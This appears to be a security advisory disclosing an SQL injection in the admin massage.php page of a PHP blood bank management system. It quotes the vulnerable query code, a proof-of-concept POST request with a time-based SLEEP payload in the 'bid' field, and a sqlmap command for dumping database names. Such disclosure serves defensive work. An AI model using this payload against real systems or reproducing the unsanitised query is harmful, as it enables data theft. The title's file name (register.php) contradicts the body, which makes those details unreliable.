# blood-bank-system-in-php register.php Critical SQL injection.

[Blood Bank System In PHP With Source Code - Source Code & Projects (code-projects.org)](https://code-projects.org/blood-bank-system-in-php-with-source-code/)

## NAME OF AFFECTED PRODUCT(S)

**blood-bank-system-in-php**

## Vendor Homepage

https://code-projects.org/blood-bank-system-in-php-with-source-code/

##  **Manufacturers sites**

https://code-projects.org/

## AFFECTED  VERSION(S)

### Vulnerable File

/admin/massage.php $bid parameter

### VERSION(S)

-  v1.0

### Software Link

https://download.code-projects.org/details/09f1f26e-072d-4fec-bd3b-974076ee162c

## PROBLEM TYPE

## Vulnerability Type

Critical SQL injection By Remote Attack

## Root Cause

In the source code，The $book parameter in the massage.php is not filtered to the SQL statement. And $_POST['bid'] save as $book. Therefore, there is an SQL injection vulnerability in the bin parameter. Database information can be obtained through this SQL injection vulnerability

## Impact

## **Description of the vulnerability**

### massage.php

In the source code，The $book parameter in the massage.php is not filtered to the SQL statement. And $_POST['bid'] save as $book. Therefore, there is an SQL injection vulnerability in the bin parameter

```
<?php
	include '../config.php';
	

	if(isset($_POST['signup']))
	{
		$book=$_POST['bid'];
		
	$query = "UPDATE `requestblood` SET `message`='$book' WHERE `id`='".$_GET['uid']."'";
	$result = $con->query($query);	
	
	
	if($result === TRUE){
		echo 'Request has Successfully been Approved';
	?>
		<meta content="4; bloodupdate.php" http-equiv="refresh" />
	<?php
	}
}
?>
```

​                                                                                                                                                                                                                                                                                                                                                                                                                   

![image-20241018085212039](https://github.com/user-attachments/assets/2c77dd01-146a-48da-bb97-f7d8060bc4d7)



## **Vulnerability recurrence**

### **POC**

```
POST /admin/massage.php?uid=2 HTTP/1.1
Host: bloodbankmgmtsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------12584321521823622462105010551
Content-Length: 286
Origin: http://bloodbankmgmtsystem
Connection: close
Referer: http://bloodbankmgmtsystem/admin/massage.php
Cookie: PHPSESSID=cv0d48g7ufjr7vpu74ah7fgu7l
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------12584321521823622462105010551
Content-Disposition: form-data; name="bid"

2' AND (SELECT 1874 FROM (SELECT(SLEEP(5)))TlEY)-- jxOI
-----------------------------12584321521823622462105010551
Content-Disposition: form-data; name="signup"

Send
-----------------------------12584321521823622462105010551--
```

save as 1.txt

excute the command.

```
python sqlmap.py -r "1.txt"  --dbs
```

We can get  databases name via the sql injection vulnerability.

![image-20241018084937873](https://github.com/user-attachments/assets/ea640a6a-4e6c-47b6-8021-ff4c6f45b25d)

